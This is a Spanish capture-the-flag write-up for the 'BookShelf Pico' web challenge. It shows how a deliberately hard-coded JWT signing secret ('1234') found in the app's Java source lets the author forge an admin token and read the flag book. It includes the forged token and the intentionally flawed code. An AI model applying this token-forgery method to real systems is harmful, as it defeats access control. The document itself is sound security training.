## Descripción

BookShelf Pico, my premium online book-reading service.

I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/f0d4f5c3a0ac2ec4c2a4bc6a29d536003fbc29dab1dc399c1b8efa36ae03625a/bookshelf-pico.zip).

Website can be accessed [here!](http://xebec.cylabacademy.net:23004/)

## Solución

Primero, ingresamos al sitio web e iniciamos sesión utilizando las credenciales proporcionadas por el reto. Una vez dentro, identificamos el libro que contiene la **flag**; sin embargo, al intentar acceder a él, observamos que solamente puede ser abierto por un usuario con permisos de administrador.

Después, descargamos el archivo proporcionado por el reto y lo descomprimimos para analizar su contenido y continuar con la búsqueda de una forma de obtener acceso al libro.

```
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ ls -la
total 5720
drwx------ 10 jeex jeex   32768 Oct  3 11:00 .
drwxr-xr-x  3 root root    4096 Sep  2 08:42 ..
-rw-------  1 jeex jeex   11119 Oct  2 23:34 .bash_history
-rw-r--r--  1 jeex jeex     220 Sep  2 08:42 .bash_logout
-rw-r--r--  1 jeex jeex    5578 Sep  2 08:42 .bashrc
-rw-r--r--  1 jeex jeex    3526 Sep  2 08:42 .bashrc.original
-rw-r--r--  1 jeex jeex 5701821 Sep 22 22:41 bookshelf-pico.zip
-rw-rw-r--  1 jeex jeex    1492 Jun  7  2022 build.gradle
drwx------  8 jeex jeex    4096 Sep  9 10:32 .BurpSuite
drwxr-xr-x  7 jeex jeex    4096 Sep 28 11:31 .cache
drwxr-xr-x  6 jeex jeex    4096 Sep 30 13:05 .config
drwxrwxr-x  3 jeex jeex    4096 Jun  7  2022 gradle
-rwxrwxr-x  1 jeex jeex    5766 Jun  7  2022 gradlew
-rw-rw-r--  1 jeex jeex    2763 Jun  7  2022 gradlew.bat
drwxr-xr-x  4 jeex jeex    4096 Sep  8 22:44 .java
-rw-------  1 jeex jeex      20 Sep 28 12:31 .lesshst
drwxr-xr-x  5 jeex jeex    4096 Sep 22 23:52 .local
-rw-r--r--  1 jeex jeex     807 Sep  2 08:42 .profile
-rw-rw-r--  1 jeex jeex    4582 Dec  9  2022 README.md
-rw-rw-r--  1 jeex jeex      43 Jun  7  2022 settings.gradle
drwxrwxr-x  4 jeex jeex    4096 Jun  7  2022 src
-rw-r--r--  1 jeex jeex       0 Sep  2 08:49 .sudo_as_admin_successful
drwxrwxr-x  4 jeex jeex    4096 Nov 26  2022 userdata
-rw-r--r--  1 jeex jeex     336 Sep  2 08:42 .zprofile
-rw-r--r--  1 jeex jeex   10882 Sep  2 08:42 .zshrc



/////////////////////////////////////////////////////////////////////////////////
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ find . -type f -name "*.java"
./src/test/java/io/github/nandandesai/pico/BookShelfBaseServerApplicationTests.java
./src/main/java/io/github/nandandesai/pico/controllers/BookController.java
./src/main/java/io/github/nandandesai/pico/controllers/UserController.java
./src/main/java/io/github/nandandesai/pico/controllers/GeneralErrorController.java
./src/main/java/io/github/nandandesai/pico/BookShelfBaseServerApplication.java
./src/main/java/io/github/nandandesai/pico/configs/UserDataPaths.java
./src/main/java/io/github/nandandesai/pico/configs/BookShelfConfig.java
./src/main/java/io/github/nandandesai/pico/repositories/BookRepository.java
./src/main/java/io/github/nandandesai/pico/repositories/UserRepository.java
./src/main/java/io/github/nandandesai/pico/repositories/RoleRepository.java
./src/main/java/io/github/nandandesai/pico/dto/requests/UserLoginRequest.java
./src/main/java/io/github/nandandesai/pico/dto/requests/UserSignUpRequest.java
./src/main/java/io/github/nandandesai/pico/dto/requests/AddBookRequest.java
./src/main/java/io/github/nandandesai/pico/dto/requests/UpdateUserPasswordRequest.java
./src/main/java/io/github/nandandesai/pico/dto/requests/UpdateUserRoleRequest.java
./src/main/java/io/github/nandandesai/pico/dto/requests/AddUserPhotoRequest.java
./src/main/java/io/github/nandandesai/pico/dto/Photo.java
./src/main/java/io/github/nandandesai/pico/dto/PDF.java
./src/main/java/io/github/nandandesai/pico/dto/RoleDto.java
./src/main/java/io/github/nandandesai/pico/dto/UserDto.java
./src/main/java/io/github/nandandesai/pico/dto/responses/ResponseType.java
./src/main/java/io/github/nandandesai/pico/dto/responses/ErrorResponse.java
./src/main/java/io/github/nandandesai/pico/dto/responses/Response.java
./src/main/java/io/github/nandandesai/pico/dto/BookDto.java
./src/main/java/io/github/nandandesai/pico/exceptions/InternalServerException.java
./src/main/java/io/github/nandandesai/pico/exceptions/ValidationException.java
./src/main/java/io/github/nandandesai/pico/exceptions/DuplicateEntityException.java
./src/main/java/io/github/nandandesai/pico/exceptions/CommonExceptionHandler.java
./src/main/java/io/github/nandandesai/pico/exceptions/ResourceNotFoundException.java
./src/main/java/io/github/nandandesai/pico/exceptions/LoginFailedException.java
./src/main/java/io/github/nandandesai/pico/exceptions/ValidationExceptionHandler.java
./src/main/java/io/github/nandandesai/pico/validators/ValidPdf.java
./src/main/java/io/github/nandandesai/pico/validators/ImageConstraintValidator.java
./src/main/java/io/github/nandandesai/pico/validators/ValidImage.java
./src/main/java/io/github/nandandesai/pico/validators/PathConstraintValidator.java
./src/main/java/io/github/nandandesai/pico/validators/PasswordConstraintValidator.java
./src/main/java/io/github/nandandesai/pico/validators/PdfConstraintValidator.java
./src/main/java/io/github/nandandesai/pico/validators/ValidPassword.java
./src/main/java/io/github/nandandesai/pico/validators/ValidPath.java
./src/main/java/io/github/nandandesai/pico/services/UserService.java
./src/main/java/io/github/nandandesai/pico/services/BookService.java
./src/main/java/io/github/nandandesai/pico/utils/FileOperation.java
./src/main/java/io/github/nandandesai/pico/security/UserSecurityDetailsService.java
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java
./src/main/java/io/github/nandandesai/pico/security/SecurityConfig.java
./src/main/java/io/github/nandandesai/pico/security/TokenException.java
./src/main/java/io/github/nandandesai/pico/security/BookPdfAccessCheck.java
./src/main/java/io/github/nandandesai/pico/security/JwtService.java
./src/main/java/io/github/nandandesai/pico/security/ReauthenticationFilter.java
./src/main/java/io/github/nandandesai/pico/security/models/UserAuthority.java
./src/main/java/io/github/nandandesai/pico/security/models/UserSecurityDetails.java
./src/main/java/io/github/nandandesai/pico/security/models/JwtUserInfo.java
./src/main/java/io/github/nandandesai/pico/models/User.java
./src/main/java/io/github/nandandesai/pico/models/Role.java
./src/main/java/io/github/nandandesai/pico/models/Book.java




////////////////////////////////////////////////////////////////////////
buscando entre esos archivos encontramos este...
///////////////////////////////////////////////////////////////////////


┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ cat ./src/main/java/io/github/nandandesai/pico/configs/BookShelfConfig.java
package io.github.nandandesai.pico.configs;

import io.github.nandandesai.pico.models.Book;
import io.github.nandandesai.pico.models.Role;
import io.github.nandandesai.pico.models.User;
import io.github.nandandesai.pico.repositories.BookRepository;
import io.github.nandandesai.pico.repositories.RoleRepository;
import io.github.nandandesai.pico.repositories.UserRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.ExitCodeGenerator;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.event.EventListener;
import org.springframework.core.io.ResourceLoader;
import org.springframework.security.crypto.password.PasswordEncoder;

import java.io.File;
import java.time.LocalDateTime;
import org.springframework.dao.DataIntegrityViolationException;
@Configuration
public class BookShelfConfig {
    private Logger logger = LoggerFactory.getLogger(BookShelfConfig.class);

    @Autowired
    private ApplicationContext appContext;

    @Autowired
    private ResourceLoader resourceLoader;

    @Autowired
    private BookRepository bookRepository;

    @Autowired
    private RoleRepository roleRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @EventListener(ApplicationReadyEvent.class)
    public void createFileStorageDirectories() {
        String currentDirectory = System.getProperty("user.dir");
        String userDataRootPath = currentDirectory + File.separator + "userdata";
        String dbDirectoryPath = currentDirectory + File.separator + "bookshelfdb";
        try {
            File dbDataDir = new File(dbDirectoryPath);
            if (dbDataDir.isDirectory()) {
                Role FreeRole = roleRepository.findById("Free").get();
                Role PremiumRole = roleRepository.findById("Premium").get();
                Role AdminRole = roleRepository.findById("Admin").get();

                /*
                 * Initialize admin and a user
                 * */
                User freeUser = new User();
                freeUser.setProfilePicName("default-avatar.png")
                        .setRole(FreeRole)
                        .setLastLogin(LocalDateTime.now())
                        .setFullName("User")
                        .setEmail("user")
                        .setPassword(passwordEncoder.encode("user"));
                userRepository.save(freeUser);

                User admin = new User();
                admin.setProfilePicName("default-avatar.png")
```

contenía la configuración de los usuarios y los libros/permisos de la aplicación.

Buscamos el secreto...

```
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ grep -Rni "secret" ./src
./src/main/resources/public/assets/pdf.worker.es5.v2.5.207.js:43994: t.ideographicsecretcircle = 0x3299;
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:14:class SecretGenerator {
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:15:    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:16:    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:26:    String getServerSecret() {
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:28:            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:29:            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:30:            return secret;
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:32:            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:33:            String newSecret = generateRandomString(32);
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:35:                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:39:            logger.info("Newly generated secret is now written to the filesystem for persistence.");
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:40:            return newSecret;
./src/main/java/io/github/nandandesai/pico/security/JwtService.java:18:    private final String SECRET_KEY;
./src/main/java/io/github/nandandesai/pico/security/JwtService.java:26:    public JwtService(SecretGenerator secretGenerator){
./src/main/java/io/github/nandandesai/pico/security/JwtService.java:27:        this.SECRET_KEY = secretGenerator.getServerSecret();
./src/main/java/io/github/nandandesai/pico/security/JwtService.java:31:        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);
./src/main/java/io/github/nandandesai/pico/security/JwtService.java:47:        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);



Ahora sabemos que se usa
Algorithm.HMAC256(SECRET_KEY);


//////////////////
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ cat ./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java
package io.github.nandandesai.pico.security;

import io.github.nandandesai.pico.configs.UserDataPaths;
import io.github.nandandesai.pico.utils.FileOperation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.nio.charset.Charset;

@Service
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}



┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ cat ./src/main/java/io/github/nandandesai/pico/security/JwtService.java
package io.github.nandandesai.pico.security;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTVerifier;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTVerificationException;
import com.auth0.jwt.interfaces.DecodedJWT;
import io.github.nandandesai.pico.security.models.JwtUserInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.Calendar;
import java.util.Date;

@Service
public class JwtService {

    private final String SECRET_KEY;

    private static final String CLAIM_KEY_USER_ID = "userId";
    private static final String CLAIM_KEY_EMAIL = "email";
    private static final String CLAIM_KEY_ROLE = "role";
    private static final String ISSUER = "bookshelf";

    @Autowired
    public JwtService(SecretGenerator secretGenerator){
        this.SECRET_KEY = secretGenerator.getServerSecret();
    }

    public String createToken(Integer userId, String email, String role){
        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);

        Calendar expiration = Calendar.getInstance();
        expiration.add(Calendar.DATE, 7); //expires after 7 days

        return JWT.create()
                .withIssuer(ISSUER)
                .withIssuedAt(new Date())
                .withExpiresAt(expiration.getTime())
                .withClaim(CLAIM_KEY_USER_ID, userId)
                .withClaim(CLAIM_KEY_EMAIL, email)
                .withClaim(CLAIM_KEY_ROLE, role)
                .sign(algorithm);
    }

    public JwtUserInfo decodeToken(String token) throws JWTVerificationException {
        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);
        JWTVerifier verifier = JWT.require(algorithm)
                .withIssuer(ISSUER)
                .build();
        DecodedJWT jwt = verifier.verify(token);
        Integer userId = jwt.getClaim(CLAIM_KEY_USER_ID).asInt();
        String email = jwt.getClaim(CLAIM_KEY_EMAIL).asString();
        String role = jwt.getClaim(CLAIM_KEY_ROLE).asString();
        return new JwtUserInfo().setEmail(email)
                .setRole(role)
                .setUserId(userId);
    }
}

////////////////////////////////////////////////////////////////////////
... ok

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }



Algorithm.HMAC256(SECRET_KEY);




```

... Y en el navegador se guarda estos datos de secion... 

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc5MTY1NTA1NywiaWF0IjoxNzkxMDUwMjU3LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.gEKCeAvJkMDvvnyW2sop4FF-Mo0F4PukQgvhgp6dQ-I


{"role":"Free","iss":"bookshelf","exp":1791655057,"iat":1791050257,"userId":1,"email":"user"}

```

Posteriormente, utilizamos la herramienta en el modo **JWT Encoder**. Dentro de este apartado, colocamos el secreto que encontramos anteriormente en el campo correspondiente, con el objetivo de generar correctamente el token JWT y continuar con el reto.

```

y esto se remplazara en Local storage.

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3OTE2NTUwNTcsImlhdCI6MTc5MTA1MDI1NywidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.T6QPQkj76cvprK6PcwvvZ6_ACqoQUvxVY8qFtLvUHsc

{"role": "Admin","iss": "bookshelf","exp": 1791655057,"iat": 1791050257,"userId": 2,"email": "admin"}


se introducen los nuevos valores, presionar Enter y refrescamos la pajina...


```

```
academy{w34k_jwt_n0t_g00d_e89d94e3}
```


## Notas adicionales

## Referencias

https://www.jwt.io/
https://www.youtube.com/watch?v=_0s0r4XLufw